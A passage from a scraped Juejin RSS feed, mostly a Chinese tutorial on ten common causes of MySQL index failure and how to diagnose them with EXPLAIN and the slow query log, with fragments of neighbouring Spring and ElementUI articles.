<p>Spring事务失效通常是由几个常见原因造成的：自调用、异常处理不当、方法权限问题、传播机制配置错误等。理解Spring事务的原理和这些失效场景，能够帮助我们在开发过程中避免陷阱，确保事务的正确性。在实际开发中，要确保事务方法正确配置，并在调用方法时遵循Spring AOP的代理机制 。 希望本文能帮助大家更好地理解和使用Spring事务，避免在生产环境中遇到事务失效的问题。如果你有其他关于Spring事务的问题或经验，欢迎在评论区分享。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【MySQL】索引失效10大场景详解：如何避免索引失效提升查询性能]]></title>    <link>https://juejin.cn/post/7580282751628083241</link>    <guid>https://juejin.cn/post/7580282751628083241</guid>    <pubDate>2025-12-06T09:34:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580282751628083241" data-draft-id="7580263284337557545" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【MySQL】索引失效10大场景详解：如何避免索引失效提升查询性能"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-06T09:34:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CyberShen"/> <meta itemprop="url" content="https://juejin.cn/user/554609587530014"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【MySQL】索引失效10大场景详解：如何避免索引失效提升查询性能
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/554609587530014/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CyberShen
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T09:34:27.000Z" title="Sat Dec 06 2025 09:34:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>深入理解MySQL索引失效的常见场景，让数据库查询性能提升一个档次</p>
</blockquote>
<p>在日常开发和数据库优化中，索引是提高查询性能最有效的手段之一。然而，很多时候我们为表添加了索引，却发现查询性能并没有提升，这很可能是索引失效导致的。本文将详细分析MySQL中索引失效的各种场景，帮助大家避免常见的陷阱。</p>
<h2 data-id="heading-0">一、索引基本原理回顾</h2>
<p>在深入了解索引失效场景前，我们先简单回顾一下MySQL索引的基本原理。MySQL最常用的索引类型是B+树索引，这种索引结构能够高效支持等值查询和范围查询。 索引类似于书籍的目录，可以帮我们快速定位到需要的数据位置。但就像目录只有在按照特定方式查找时才有效一样，索引也需要在合适的查询条件下才能发挥作用。</p>
<h2 data-id="heading-1">二、索引失效的常见场景</h2>
<h3 data-id="heading-2">1. 违反最左前缀匹配原则</h3>
<p><strong>问题描述</strong>：在使用复合索引（多列索引）时，如果查询条件没有从索引的最左列开始，索引将无法被使用。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建复合索引</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_country_city <span class="hljs-keyword">ON</span> users(country, city);

<span class="hljs-comment">-- 有效：使用了索引的最左列</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> country <span class="hljs-operator">=</span> <span class="hljs-string">'China'</span>;

<span class="hljs-comment">-- 失效：跳过了最左列country，直接使用city</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> city <span class="hljs-operator">=</span> <span class="hljs-string">'Beijing'</span>;
</code></pre>
<p><strong>原理解析</strong>：复合索引在B+树中是按照索引定义的列顺序排序的。想象一下电话簿先按姓氏排序，同姓氏下再按名字排序。如果只知道名字不知道姓氏，就无法利用电话簿的有序性快速查找。 <strong>解决方案</strong>：设计复合索引时，将查询中最频繁使用的列放在最左边。对于上面的失效查询，可以单独为city字段创建索引，或者调整查询条件包含country字段。</p>
<h3 data-id="heading-3">2. 在索引列上使用函数或表达式</h3>
<p><strong>问题描述</strong>：在WHERE子句中对索引列使用函数或表达式，会导致索引失效。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建索引</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_create_time <span class="hljs-keyword">ON</span> orders(create_time);

<span class="hljs-comment">-- 失效：在索引列上使用了函数</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> orders <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">YEAR</span>(create_time) <span class="hljs-operator">=</span> <span class="hljs-number">2023</span>;
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> orders <span class="hljs-keyword">WHERE</span> <span class="hljs-built_in">UPPER</span>(username) <span class="hljs-operator">=</span> <span class="hljs-string">'JOHN'</span>;
</code></pre>
<p><strong>原理解析</strong>：索引存储的是列的原始值，而不是函数计算后的值。当对索引列应用函数时，MySQL需要对每一行数据都计算函数结果，然后再比较，导致无法使用索引。 <strong>解决方案</strong>：将函数应用于条件值而不是列：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 优化后：将函数应用于条件值</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> orders 
<span class="hljs-keyword">WHERE</span> create_time <span class="hljs-operator">&gt;=</span> <span class="hljs-string">'2023-01-01 00:00:00'</span> 
  <span class="hljs-keyword">AND</span> create_time <span class="hljs-operator">&lt;</span> <span class="hljs-string">'2024-01-01 00:00:00'</span>;
</code></pre>
<h3 data-id="heading-4">3. 隐式类型转换</h3>
<p><strong>问题描述</strong>：当查询条件中的值类型与索引列定义的类型不匹配时，MySQL会进行隐式类型转换，导致索引失效。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建表和索引</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> users (
    id <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY</span> KEY,
    phone <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">20</span>),
    INDEX idx_phone (phone)
);

<span class="hljs-comment">-- 失效：phone是VARCHAR类型，但条件值是数字</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> phone <span class="hljs-operator">=</span> <span class="hljs-number">13800138000</span>;
</code></pre>
<p><strong>原理解析</strong>：MySQL在执行查询时，需要将条件值转换为与索引列相同的类型，这相当于在索引列上应用了转换函数。 <strong>解决方案</strong>：确保条件值与索引列类型一致：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 正确：使用相同类型</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> phone <span class="hljs-operator">=</span> <span class="hljs-string">'13800138000'</span>;
</code></pre>
<h3 data-id="heading-5">4. 使用LIKE操作符且以通配符开头</h3>
<p><strong>问题描述</strong>：使用LIKE进行模糊查询时，如果模式以通配符（%）开头，索引通常会失效。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建索引</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_product_name <span class="hljs-keyword">ON</span> products(product_name);

<span class="hljs-comment">-- 失效：以通配符开头</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> products <span class="hljs-keyword">WHERE</span> product_name <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'%phone%'</span>;
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> products <span class="hljs-keyword">WHERE</span> product_name <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'%phone'</span>;
</code></pre>
<p><strong>原理解析</strong>：B+树索引是按照索引列的完整值排序的。当使用前缀通配符时，MySQL无法利用索引的有序性来定位数据，只能进行全表扫描。 <strong>解决方案</strong>：</p>
<ol>
<li>避免使用前缀通配符，改用后缀通配符：</li>
</ol>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 有效：使用后缀通配符</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> products <span class="hljs-keyword">WHERE</span> product_name <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'phone%'</span>;
</code></pre>
<ol>
<li>对于必须使用前缀通配符的场景，考虑使用全文索引：</li>
</ol>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建全文索引</span>
<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> products <span class="hljs-keyword">ADD</span> FULLTEXT INDEX ft_product_name(product_name);

<span class="hljs-comment">-- 使用全文索引查询</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> products 
<span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">MATCH</span>(product_name) AGAINST(<span class="hljs-string">'phone'</span> <span class="hljs-keyword">IN</span> <span class="hljs-type">BOOLEAN</span> MODE);
</code></pre>
<h3 data-id="heading-6">5. 使用OR操作符连接条件</h3>
<p><strong>问题描述</strong>：当使用OR连接多个条件，且这些条件并非都使用索引时，可能导致索引失效。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建单列索引</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_name <span class="hljs-keyword">ON</span> customers(name);

<span class="hljs-comment">-- 失效：email列没有索引</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> customers 
<span class="hljs-keyword">WHERE</span> name <span class="hljs-operator">=</span> <span class="hljs-string">'John'</span> <span class="hljs-keyword">OR</span> email <span class="hljs-operator">=</span> <span class="hljs-string">'john@example.com'</span>;
</code></pre>
<p><strong>原理解析</strong>：MySQL在处理OR条件时，如果其中一个条件无法使用索引，优化器可能会选择全表扫描，因为这种成本可能低于分别使用索引再合并结果。 <strong>解决方案</strong>：</p>
<ol>
<li>为OR连接的所有列创建索引</li>
<li>使用UNION替代OR：</li>
</ol>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 使用UNION优化</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> customers <span class="hljs-keyword">WHERE</span> name <span class="hljs-operator">=</span> <span class="hljs-string">'John'</span>
<span class="hljs-keyword">UNION</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> customers <span class="hljs-keyword">WHERE</span> email <span class="hljs-operator">=</span> <span class="hljs-string">'john@example.com'</span>;
</code></pre>
<h3 data-id="heading-7">6. 对索引列进行运算</h3>
<p><strong>问题描述</strong>：在WHERE子句中对索引列进行算术运算会导致索引失效。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建索引</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_price <span class="hljs-keyword">ON</span> products(price);

<span class="hljs-comment">-- 失效：对索引列进行运算</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> products <span class="hljs-keyword">WHERE</span> price <span class="hljs-operator">+</span> <span class="hljs-number">100</span> <span class="hljs-operator">&gt;</span> <span class="hljs-number">500</span>;
</code></pre>
<p><strong>原理解析</strong>：与函数使用类似，对索引列进行运算改变了列的原始值，使得MySQL无法直接使用索引。 <strong>解决方案</strong>：将运算应用于条件值，而不是列：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 优化后：将运算应用于条件值</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> products <span class="hljs-keyword">WHERE</span> price <span class="hljs-operator">&gt;</span> <span class="hljs-number">500</span> <span class="hljs-operator">-</span> <span class="hljs-number">100</span>;
</code></pre>
<h3 data-id="heading-8">7. 使用否定操作符</h3>
<p><strong>问题描述</strong>：使用<code>!=</code>、<code>&lt;&gt;</code>、<code>NOT IN</code>、<code>NOT LIKE</code>等否定条件时，通常会导致索引失效。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建索引</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_status <span class="hljs-keyword">ON</span> orders(status);

<span class="hljs-comment">-- 可能失效：使用否定条件</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> orders <span class="hljs-keyword">WHERE</span> status <span class="hljs-operator">!=</span> <span class="hljs-string">'completed'</span>;
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> orders <span class="hljs-keyword">WHERE</span> status <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">IN</span> (<span class="hljs-string">'completed'</span>, <span class="hljs-string">'shipped'</span>);
</code></pre>
<p><strong>原理解析</strong>：否定条件通常需要查找大部分数据，MySQL优化器可能判断全表扫描比使用索引更高效。 <strong>解决方案</strong>：尽量使用肯定条件替代否定条件，或增加更多过滤条件缩小结果集。</p>
<h3 data-id="heading-9">8. 数据重复度过高（低选择性）</h3>
<p><strong>问题描述</strong>：当索引列的不同值很少（选择性低）时，MySQL可能选择不使用索引。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建索引</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_gender <span class="hljs-keyword">ON</span> users(gender);

<span class="hljs-comment">-- 可能失效：gender只有少数几个不同值</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> gender <span class="hljs-operator">=</span> <span class="hljs-string">'male'</span>;
</code></pre>
<p><strong>原理解析</strong>：对于低选择性的列，使用索引可能需要访问大量的索引页和数据页，效率可能不如全表扫描。 <strong>解决方案</strong>：</p>
<ol>
<li>增加更多的过滤条件，减小结果集：</li>
</ol>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users 
<span class="hljs-keyword">WHERE</span> gender <span class="hljs-operator">=</span> <span class="hljs-string">'male'</span> <span class="hljs-keyword">AND</span> age <span class="hljs-keyword">BETWEEN</span> <span class="hljs-number">25</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">35</span>;
</code></pre>
<ol>
<li>使用覆盖索引避免回表：</li>
</ol>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建覆盖索引</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_gender_age_name <span class="hljs-keyword">ON</span> users(gender, age, name);

<span class="hljs-comment">-- 查询仅需要索引中包含的列</span>
<span class="hljs-keyword">SELECT</span> gender, age, name <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> gender <span class="hljs-operator">=</span> <span class="hljs-string">'male'</span>;
</code></pre>
<h3 data-id="heading-10">9. 查询返回大量数据</h3>
<p><strong>问题描述</strong>：当查询条件返回的结果集占表总数据量的比例较大时（通常超过20%-30%），MySQL优化器可能会选择全表扫描。 <strong>原理解析</strong>：使用索引查询涉及索引查找和回表操作。当结果集较大时，这种"随机IO"的成本可能高于顺序读取全表的成本。 <strong>解决方案</strong>：优化查询，添加更多过滤条件减小结果集，或使用分页查询。</p>
<h3 data-id="heading-11">10. ORDER BY使用不当</h3>
<p><strong>问题描述</strong>：当ORDER BY的列与WHERE条件中使用的索引列不一致时，可能导致额外的排序操作。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建索引</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_name <span class="hljs-keyword">ON</span> users(name);

<span class="hljs-comment">-- 可能产生filesort操作</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> name <span class="hljs-operator">=</span> <span class="hljs-string">'John'</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> create_time;
</code></pre>
<p><strong>原理解析</strong>：B+树索引本身是有序的，但如果排序或分组的列与索引列不一致，MySQL需要在检索出结果后再进行排序（filesort）。 <strong>解决方案</strong>：创建包含排序/分组列的复合索引：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建包含排序列的复合索引</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_name_create_time <span class="hljs-keyword">ON</span> users(name, create_time);

<span class="hljs-comment">-- 现在可以使用索引排序</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> name <span class="hljs-operator">=</span> <span class="hljs-string">'John'</span> <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> create_time;
</code></pre>
<h2 data-id="heading-12">三、诊断索引失效的工具和方法</h2>
<h3 data-id="heading-13">1. 使用EXPLAIN分析查询计划</h3>
<p>EXPLAIN是诊断索引使用情况的主要工具：</p>
<pre><code class="hljs language-ini" lang="ini">EXPLAIN SELECT * FROM orders WHERE <span class="hljs-attr">customer_id</span> = <span class="hljs-number">1001</span> AND status = <span class="hljs-string">'completed'</span><span class="hljs-comment">;</span>
</code></pre>
<p>重点关注以下字段：</p>
<ul>
<li><strong>type</strong>：访问类型，从好到差依次是：system &gt; const &gt; eq_ref &gt; ref &gt; range &gt; index &gt; ALL</li>
<li><strong>key</strong>：实际使用的索引，如果为NULL则表示未使用索引</li>
<li><strong>rows</strong>：预计扫描的行数，数值越小越好</li>
<li><strong>Extra</strong>：额外信息，如"Using filesort"表示需要额外排序</li>
</ul>
<h3 data-id="heading-14">2. 使用慢查询日志</h3>
<p>启用慢查询日志可以帮助发现性能差的SQL语句：</p>
<pre><code class="hljs language-ini" lang="ini">SET GLOBAL <span class="hljs-attr">slow_query_log</span> = <span class="hljs-string">'ON'</span><span class="hljs-comment">;</span>
SET GLOBAL <span class="hljs-attr">long_query_time</span> = <span class="hljs-number">1</span><span class="hljs-comment">;  -- 设置慢查询阈值为1秒</span>
</code></pre>
<h3 data-id="heading-15">3. 使用性能模式（Performance Schema）</h3>
<p>MySQL 5.6及以上版本提供了强大的性能监控工具：</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 查看查询性能统计</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> performance_schema.events_statements_summary_by_digest
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> sum_timer_wait <span class="hljs-keyword">DESC</span> LIMIT <span class="hljs-number">10</span>;
</code></pre>
<h2 data-id="heading-16">四、索引设计与使用的最佳实践</h2>
<ol>
<li><strong>合理设计复合索引</strong>：遵循最左前缀原则，将高选择性的列放在前面。</li>
<li><strong>避免过度索引</strong>：索引会占用空间，并在数据修改时带来维护开销。</li>
<li><strong>考虑使用覆盖索引</strong>：减少回表操作，提高查询性能。</li>
<li><strong>定期更新统计信息</strong>：使用<code>ANALYZE TABLE</code>命令更新统计信息，帮助优化器做出更好的决策。</li>
<li><strong>使用连接查询优化</strong>：确保连接字段的数据类型和字符集一致。</li>
</ol>
<h2 data-id="heading-17">五、总结</h2>
<p>MySQL索引失效通常是由查询语句编写不当或索引设计不合理导致的。了解这些常见的索引失效场景，并在开发和优化过程中避免这些问题，可以显著提高数据库查询性能。 最关键的是养成使用EXPLAIN分析查询计划的习惯，确保索引被正确使用。同时，合理的索引设计和持续的SQL优化是保证数据库性能的重要手段。 希望本文能帮助大家更好地理解和使用MySQL索引，避免在生产环境中遇到性能问题。如果你有其他关于MySQL索引的问题或经验，欢迎在评论区分享讨论。</p>
<blockquote>
<p>本文基于MySQL 8.0版本编写，不同版本的MySQL在优化器行为上可能有细微差异。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ElementUI组件出现大量重复样式]]></title>    <link>https://juejin.cn/post/7580263284337524777</link>    <guid>https://juejin.cn/post/7580263284337524777</guid>    <pubDate>2025-12-06T09:25:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580263284337524777" data-draft-id="7580297762189705257" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ElementUI组件出现大量重复样式"/> <meta itemprop="keywords" content="Element,SCSS,Vue.js"/> <meta itemprop="datePublished" content="2025-12-06T09:25:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="魂祈梦"/> <meta itemprop="url" content="https://juejin.cn/user/1841010886858137"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ElementUI组件出现大量重复样式
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1841010886858137/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    魂祈梦
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T09:25:15.000Z" title="Sat Dec 06 2025 09:25:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
